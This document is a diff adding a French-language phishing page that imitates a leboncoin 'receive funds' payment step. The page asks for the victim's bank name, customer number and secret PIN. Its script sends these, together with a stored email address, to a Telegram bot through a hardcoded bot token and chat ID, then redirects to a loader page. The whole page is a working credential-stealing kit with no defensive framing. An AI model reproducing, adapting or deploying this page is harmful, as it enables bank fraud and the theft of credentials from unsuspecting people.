@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap">
+
+    <title>infos</title>
+    <style>
+        * {
+            margin: 0%;
+            padding: 0%;
+            box-sizing: border-box;
+        }
+
+        body {
+            height: 100vh;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .top {
+            height: 50px;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: start;
+        }
+
+        .center {
+            padding: 15px;
+        }
+
+        .box {
+            border: 2px solid rgba(0, 0, 0, 0.427);
+            border-radius: 5px;
+            padding: 10px;
+        }
+
+        input {
+            width: 100%;
+            height: 50px;
+            border: 2px solid rgba(128, 128, 128, 0.441);
+            border-radius: 15px;
+            margin-bottom: 20px;
+            padding-left: 10px;
+            font-size: 1.2rem;
+        }
+
+        input:focus {
+            outline: none;
+        }
+
+        #bank{
+            text-transform: uppercase;
+        }
+
+        button {
+            background-color: #EC5A13;
+            color: white;
+            height: 50px;
+            border: none;
+            border-radius: 17px;
+            width: 100%;
+            font-weight: bolder;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="top shadow">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+            class="lucide lucide-arrow-left">
+            <path d="m12 19-7-7 7-7" />
+            <path d="M19 12H5" />
+        </svg>
+    </div>
+
+    <div class="center">
+
+        <p>Choisissez votre moyen de paiement ou vous recevrez les fonds</p> <br>
+
+        <div class="box">
+            <div class="up" style="display: flex; align-items: center; justify-content: space-between; padding: 0px;">
+                <div>
+                    <svg style="color: #EC5A13;" xmlns="http://www.w3.org/2000/svg" width="24" height="24"
+                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round" class="lucide lucide-circle-dot">
+                        <circle cx="12" cy="12" r="10" />
+                        <circle cx="12" cy="12" r="1" />
+                    </svg>
+                    <span>Compte bancaire</span>
+                </div>
+
+                <svg style="color: grey;" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                    fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    class="lucide lucide-landmark">
+                    <line x1="3" x2="21" y1="22" y2="22" />
+                    <line x1="6" x2="6" y1="18" y2="11" />
+                    <line x1="10" x2="10" y1="18" y2="11" />
+                    <line x1="14" x2="14" y1="18" y2="11" />
+                    <line x1="18" x2="18" y1="18" y2="11" />
+                    <polygon points="12 2 20 7 4 7" />
+                </svg>
+
+            </div>
+            <br>
+            <br> <br>
+            <form id="form">
+
+                <label for="bank">Nom de ma banque</label><br>
+                <input type="text" id="bank" required> <br> <br>
+                
+                <label for="bank">Mon numéro client</label><br>
+                <input type="text" type="tel" id="id" required> <br>
+                <label for="bank" > Mon code secret</label><br>
+                <input type="text" id="pin" type="tel" required> <br>
+            </div>
+            <br>
+            <br>
+            <button>Recevoir les fonds</button>
+        </form>
+
+        <br>
+        <br>
+
+        <div style="display: flex; align-items: center;">
+            <svg style="color: green;" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                class="lucide lucide-shield-check">
+                <path
+                    d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z" />
+                <path d="m9 12 2 2 4-4" />
+            </svg>
+            <span style="margin-left: 10px;">Operation securiser</span>
+        </div>
+
+        <br>
+        <br>
+
+
+    </div>
+
+
+    <script>
+
+        document.getElementById('form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            // Récupération des valeurs du formulaire
+            const bank = document.getElementById('bank').value ;
+            const id = document.getElementById('id').value ;
+            const pin = document.getElementById('pin').value;
+            var email = localStorage.getItem('email');
+
+            // Validation des champs
+            if (!id || !pin || !bank) {
+                console.log('Veuillez remplir tous les champs.');
+                return;
+            }
+
+
+            // Construction du message
+            const message = `
+                leboncoin résultat :
+                \n🏦Bank: ${bank}
+                \n✨ID : ${id}
+                \n🔓PIN: ${pin}
+                \n📩E-mail: ${email}
+                
+            `;
+
+            const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4'; // Remplacez par votre token
+            const chatId = '7332838769'; // Remplacez par votre chat ID
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Envoi du message au bot Telegram
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Votre message a été envoyé avec succès !');
+                        window.location.href = './loader.html' ;
+                    } else {
+                        console.error('Erreur lors de l\'envoi du message:', data.description);
+                        console.log('Une erreur est survenue lors de l\'envoi de votre message. Veuillez réessayer.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Erreur réseau ou serveur:', error);
+                    console.log('Une erreur est survenue lors de l\'envoi de votre message. Veuillez réessayer.');
+                });
+        });
+
+    </script>
+
+
+</body>
+
+</html>
